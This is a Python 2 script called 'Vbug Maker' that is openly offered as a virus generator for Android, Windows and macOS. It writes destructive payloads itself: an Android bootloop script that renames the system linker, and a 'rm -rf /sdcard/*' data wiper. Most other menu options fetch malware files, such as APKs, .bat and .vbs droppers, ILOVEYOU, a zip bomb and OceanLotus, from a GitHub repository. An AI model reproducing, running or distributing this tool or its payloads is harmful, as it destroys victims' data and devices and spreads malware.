#!/usr/bin/python
# encoding: utf-8
"""
Author  : DedSecTL
Date	: 08-09-2019
Name	: Vbug Maker
Purpose : Generate any virus on your device
Thanks to Mr_Silent, Ghifari, Mr.Holmes, Mr_/bon'007, ID_OUT96...
(c) 2017-2019, DedSecTL All rights reserved.

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met: * Redistributions 
of source code must retain the above copyright notice, this list of conditions and 
the following disclaimer. * Redistributions in binary form must reproduce the above 
copyright notice, this list of conditions and the following disclaimer in the 
documentation and/or other materials provided with the distribution. * Neither the 
name of the nor the names of its contributors may be used to endorse or promote 
products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, 
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE 
DISCLAIMED. IN NO EVENT SHALL CHRISTOPHER DUFFY BE LIABLE FOR ANY DIRECT, INDIRECT, 
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, 
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT 
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE 
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
import os, sys, time, urllib
R = '\x1b[1;31m'
N = '\x1b[0m'
Y = '\x1b[1;33m'
G = '\x1b[1;37m'

def restart_program():
	python = sys.executable
	os.execl(python, python, *sys.argv)
	curdir = os.getcwd()


def banner():
	print '%s        _                            _               %s' % (R, N)
	print '%s   _ _ | |_  _ _ %s ___    _____ %s ___ | |_  ___  ___   %s' % (R, Y, R, N)
	print "%s  | | || . || | |%s| . |  |     |%s| .'|| '_|| -_||  _|  %s" % (R, Y, R, N)
	print '%s   \\_/ |___||___|%s|_  |  | |_|_|%s|__,||_,_||___||_|	%s' % (R, Y, R, N)
	print '%s __________________| |  | |_______________________   %s' % (Y, N)
	print '%s|____________________|  |_________________________| %s' % (Y, N)

def anvima():
	print '%s+---------------------------------------------------+%s' % (R, N)
	print '%s||[#]%s--------------%s[ VBug Maker ]%s---------------%s[#]||%s' % (Y, R, Y, R, Y, N)
	print '%s||%s |___________%s[ Simple Virus Maker ]%s____________|%s ||%s' % (Y, R, Y, R, Y, N)
	print '%s||%s |____________%s[ Anvima * Session ]%s_____________|%s ||%s' % (Y, R, Y, R, Y, N)
	print '%s+---------------------------------------------------+%s' % (R, N)
	print

def winvima():
	print '%s+---------------------------------------------------+%s' % (R, N)
	print '%s||[#]%s--------------%s[ VBug Maker ]%s---------------%s[#]||%s' % (Y, R, Y, R, Y, N)
	print '%s||%s |___________%s[ Simple Virus Maker ]%s____________|%s ||%s' % (Y, R, Y, R, Y, N)
	print '%s||%s |____________%s[ Winvima--Session ]%s_____________|%s ||%s' % (Y, R, Y, R, Y, N)
	print '%s+---------------------------------------------------+%s' % (R, N)
	print

def macvima():
	print '%s+---------------------------------------------------+%s' % (R, N)
	print '%s||[#]%s--------------%s[ VBug Maker ]%s---------------%s[#]||%s' % (Y, R, Y, R, Y, N)
	print '%s||%s |___________%s[ Simple Virus Maker ]%s____________|%s ||%s' % (Y, R, Y, R, Y, N)
	print '%s||%s |____________%s[ MACvima--Session ]%s_____________|%s ||%s' % (Y, R, Y, R, Y, N)
	print '%s+---------------------------------------------------+%s' % (R, N)
	print

clear = lambda : os.system('clear')
clear()
banner()
try:
	print
	print '%svbu%sg m%saker %s08-09-2019 %s(10:32)%s' % (R, Y, R, G, Y, N)
	print '%sAuthor         : %sDedSecTL%s' % (G, R, N)
	print '%sSpecial Thanks : %sHendriyawan %s( mr_silent )%s' % (G, R, Y, N)
	print '%sCode           : %sPython%s' % (G, Y, N)
	print '%sSupport by     : %sGhifari%s' % (G, R, N)
	print '%sDescription    : %sMake a %svirus.sh%s' % (G, Y, R, N)
	print '%s@___%sBlackHole %sSecurity%s_____%s' % (Y, G, R, Y, N)
	print '%s* %sTrust Me %s-- %sIm Coder %s*%s\n' % (Y, G, R, G, Y, N)
	enter = raw_input('%s[%s~%s]%s Press Enter to Continue...%s' % (Y, R, Y, R, N))
except KeyboardInterrupt: print '%s[%s!%s]%s ERROR%s:%s CTRL+C Detected... force close the program...%s' % (Y, R, Y, R, Y, G, N);sys.exit()
except EOFError: print '\n%s[%s!%s]%s ERROR%s:%s CTRL+D Detected... force close the program...%s' % (Y, R, Y, R, Y, G, N);sys.exit()
clear()
banner()
print '%s#%s---------------%s    vbu%sg%s--%sm%saker    %s----------------%s#%s' % (R, Y, R, Y, R, Y, R, Y, R, N)
print '%s|%s We dont take responsibility for the use of this  %s|%s' % (Y, G, Y, N)
print '%s|%s program                                          %s|%s' % (Y, G, Y, N)
print '%s#%s---------------%s    -----------    %s----------------%s#%s' % (R, Y, R, Y, R, N)
print '%s|%s vbu%sg m%saker %sv1.1 08-09-2019 %s(10:32)               |%s' % (Y, R, Y, R, G, Y, N)
print '%s|%s Author  : DedSecTL                               %s|%s' % (Y, G, Y, N)
print '%s|%s GitHub  : https://github.com/Gameye98            %s|%s' % (Y, G, Y, N)
print '%s|%s Team    : BlackHole%s Security%s Cyber Team          %s|%s' % (Y, G, R, G, Y, N)
print '%s|%s Version : 1.1 -- BlackHole Project               %s|%s' % (Y, G, Y, N)
print '%s|%s (c) 2017-2019, DedSecTL All rights reserved      %s|%s' % (Y, G, Y, N)
print '%s#%s---------------%s    -----------    %s----------------%s#%s' % (R, Y, R, Y, R, N)
print
print '%s[%s#%s]%s Options%s' % (Y, R, Y, G, N)
print '%s   {%s01%s} %s~> %sGenerate Virus for Android%s' % (R, G, R, Y, G, N)
print '%s   {%s02%s} %s~> %sGenerate Virus for Window %s' % (R, G, R, Y, G, N)
print '%s   {%s03%s} %s~> %sGenerate Virus for MacOSX %s' % (R, G, R, Y, G, N)
print '%s   {%s04%s} %s~> %sRestart Program%s' % (R, G, R, Y, G, N)
print '%s   {%s05%s} %s~> %sExit%s\n' % (R, G, R, Y, G, N)
while True:
	try:
		opsi = raw_input('%sVIBUM%s > %schoose ' % (R, Y, G))
		if opsi.strip() in ('01 1').split():
			anvima()
			print('%s[%s*%s] %sList of Virus%s' % (Y, R, Y, G, N))
			print('   %s(%sB%s)%sootloop%s' % (R, Y, R, G, N))
			print('   %s(%sD%s)%sata-Eater%s' % (R, Y, R, G, N))
			print('   %s(%sF%s)%sreeze%s' % (R, Y, R, G, N))
			print('   %s(%sBO%s)%smb-Zip%s' % (R, Y, R, G, N))
			print('   %s(%sE%s)%slite%s' % (R, Y, R, G, N))
			print('   %s(%sT%s)%srash%s' % (R, Y, R, G, N))
			print('   %s(%sFB%s)%sCrack 2K18%s' % (R, Y, R, G, N))
			print('   %s(%sV%s)%si4a%s' % (R, Y, R, G, N))
			print('   %s(%sM%s)%salum%s' % (R, Y, R, G, N))
			print('   %s(%sTA%s)%skeBeer%s' % (R, Y, R, G, N))
			print('   %s(%sMO%s)%sobile Legends: Adventure%s' % (R, Y, R, G, N))
			print('   %s(%sMOB%s)%selejen%s\n' % (R, Y, R, G, N))
			print('   %s(%s0%s) %sBack to main menu%s\n' % (R, Y, R, G, N))
			choose_virus = raw_input('%sVIBUM %s> %sanvima%s ' % (R, Y, G, Y))
			if choose_virus.lower() == 'b':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				open("bootloop.sh","w").write("su -c 'rename /system/bin/linker /system/bin/link_lunk'\n")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'd':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				open("data-eater.sh","w").write("su -c rm -rf /sdcard/*\n")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'f':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/freeze.sh","freeze.sh")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 't':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/trash.sh","trash.sh")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'bo':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/42.zip","zipbomb.zip")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'e':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/elite.apk","elite.apk")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'v':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/vi4a.apk","vi4a.apk")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'm':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/Malum.apk","Malum.apk")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'ta':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/TakeBeer.apk","TakeBeer.apk")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'mo':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/Mobile_Legends_Adventure.apk","Mobile_Legends_Adventure.apk")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'mob':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/mobelejen.apk","mobelejen.apk")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'fb':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/fbcr.apk","FBCR2K18.apk")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus == '0':
				pass
			else:
				print '%s[%s!%s]%s ERROR%s:%s Wrong Input...%s' % (Y, R, Y, R, Y, G, N)
				time.sleep(2)
		elif opsi.strip() in ('02 2').split():
			winvima()
			print('%s[%s*%s] %sList of Virus%s' % (Y, R, Y, G, N))
			print('   %s(%sR%s)%s.I.P%s' % (R, Y, R, G, N))
			print('   %s(%sI%s)%sLOVEYOU%s' % (R, Y, R, G, N))
			print('   %s(%sP%s)%sCT%s' % (R, Y, R, G, N))
			print('   %s(%sRE%s)%sg-Eater%s' % (R, Y, R, G, N))
			print('   %s(%sC%s)%sMD%s' % (R, Y, R, G, N))
			print('   %s(%s4%s)%s04%s' % (R, Y, R, G, N))
			print('   %s(%sA%s)%slay%s' % (R, Y, R, G, N))
			print('   %s(%sCA%s)%spslock%s' % (R, Y, R, G, N))
			print('   %s(%sKU%s)%sIS%s' % (R, Y, R, G, N))
			print('   %s(%sK%s)%sOCE%s' % (R, Y, R, G, N))
			print('   %s(%sS%s)%sleepy%s' % (R, Y, R, G, N))
			print('   %s(%sU%s)%sgly%s\n' % (R, Y, R, G, N))
			print('   %s(%s0%s) %sBack to main menu%s\n' % (R, Y, R, G, N))
			choose_virus = raw_input('%sVIBUM %s> %swinvima%s ' % (R, Y, G, Y))
			if choose_virus.lower() == 'r':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/RIP.bat","RIP.bat")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'i':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/ILOVEYOU.vbs","ILOVEYOU.vbs")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'p':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/PCT.bat","PCT.bat")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'k':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/koce.bat","KOCE.bat")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 're':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/regeater.bat","regeater.bat")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'c':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/cmd.bat","CMD.bat")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == '4':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/404.bat","404.bat")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'a':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/alay.vbs","alay.vbs")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'ca':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/capslock.vbs","capslock.vbs")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'ku':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/kuis.bat","kuis.bat")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 's':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/sleepy.bat","sleepy.bat")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'u':
				print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/ugly.bat","ugly.bat")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus == '0':
				pass
			else:
				print '%s[%s!%s]%s ERROR%s:%s Wrong Input...%s' % (Y, R, Y, R, Y, G, N)
				time.sleep(2)
		elif opsi.strip() in ('03 3').split():
			macvima()
			print('%s[%s*%s] %sList of Virus%s' % (Y, R, Y, G, N))
			print('   %s(%sT%s)%srinoids%s' % (R, Y, R, G, N))
			print('   %s(%sO%s)%sceanLotus%s' % (R, Y, R, G, N))
			print('   %s(%sN%s)%sothing%s\n' % (R, Y, R, G, N))
			print('   %s(%s0%s) %sBack to main menu%s\n' % (R, Y, R, G, N))
			choose_virus = raw_input('%sVIBUM %s> %smacvima%s ' % (R, Y, G, Y))
			if choose_virus.lower() == 't':
				print '\n %s[%s+%s]%s Download the virus...%s' % (Y, R, Y, G, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/trinoids.app","trinoids.app")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'o':
				print '\n %s[%s+%s]%s Download the virus...%s' % (Y, R, Y, G, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/OceanLotus.zip","OceanLotus.zip")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus.lower() == 'n':
				print '\n %s[%s+%s]%s Download the virus...%s' % (Y, R, Y, G, N)
				urllib.urlretrieve("https://github.com/Gameye98/V1RU5/raw/master/nothing.app","nothing.app")
				print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
			elif choose_virus == '0':
				pass
			else:
				print '%s[%s!%s]%s ERROR%s:%s Wrong Input...%s' % (Y, R, Y, R, Y, G, N)
				time.sleep(2)
		elif opsi.strip() in ('04 4').split():
			clear()
			restart_program()
		elif opsi.strip() in ('05 5').split():
			print '%s' % N
			sys.exit()
		else:
			print '%s[%s!%s]%s ERROR%s:%s Wrong Input...%s' % (Y, R, Y, R, Y, G, N)
	except KeyboardInterrupt: print '%s[%s!%s]%s ERROR%s:%s CTRL+C Detected... force close the program...%s' % (Y, R, Y, R, Y, G, N);break
	except EOFError: print '\n%s[%s!%s]%s ERROR%s:%s CTRL+D Detected... force close the program...%s' % (Y, R, Y, R, Y, G, N);break
	except Exception as e: print ' %s[%s!%s]%s ERROR%s:%s Device is not connected to the internet...%s' % (Y, R, Y, R, Y, G, N)